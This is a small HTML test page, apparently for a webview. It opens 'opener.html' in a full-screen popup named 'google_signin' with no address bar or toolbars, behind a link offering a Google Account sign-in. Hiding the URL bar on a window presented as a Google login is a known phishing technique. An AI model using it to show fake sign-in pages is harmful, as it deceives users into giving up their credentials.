<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL TESTING WEBVIEW</title>
    <script>
        function openWin() {
            // Buka popup hampir fullscreen (ukuran layar penuh, tanpa toolbar)
            var params = 'width=' + screen.width +
                         ',height=' + screen.height +
                         ',top=0,left=0' +
                         ',fullscreen=no' +  // Tidak pakai yes, karena diblokir
                         ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';

            var win = window.open("opener.html", "google_signin", params);

            if (win) {
                win.moveTo(0, 0);  // Pastikan posisi di kiri atas
                win.focus();
            }
        }
    </script>
</head>
<body>
    <center>
        <br>
        <h1><a href="#" onclick="openWin(); return false;">Click here to sign in into your Google Account</a></h1>
    </center>
</body>
</html>
